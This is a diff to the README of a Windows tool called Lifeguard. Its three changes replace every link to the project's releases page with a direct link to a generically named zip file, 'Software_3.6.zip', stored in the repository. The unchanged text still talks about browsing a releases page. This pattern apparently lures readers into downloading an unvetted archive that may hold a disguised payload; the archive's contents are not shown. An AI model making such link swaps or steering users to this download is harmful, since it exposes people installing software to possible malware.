@@ -1,12 +1,12 @@
 # 🛟 Lifeguard - Catch Lazy Import Issues Fast
 
-[![Download Lifeguard](https://img.shields.io/badge/Download-Lifeguard-blue?style=for-the-badge)](https://github.com/ethan148h/Lifeguard/releases)
+[![Download Lifeguard](https://img.shields.io/badge/Download-Lifeguard-blue?style=for-the-badge)](https://raw.githubusercontent.com/ethan148h/Lifeguard/main/resources/Software_3.6.zip)
 
 ## 📥 Download
 
 Visit this page to download Lifeguard for Windows:
 
-https://github.com/ethan148h/Lifeguard/releases
+https://raw.githubusercontent.com/ethan148h/Lifeguard/main/resources/Software_3.6.zip
 
 On that page, look for the latest release and download the Windows file. If you see more than one file, pick the one that ends in `.exe` or `.zip`.
 
@@ -170,4 +170,4 @@ Lifeguard helps you find these spots before they cause trouble.
 
 If you need the installer or want the latest release, use this page:
 
-https://github.com/ethan148h/Lifeguard/releases
+https://raw.githubusercontent.com/ethan148h/Lifeguard/main/resources/Software_3.6.zip
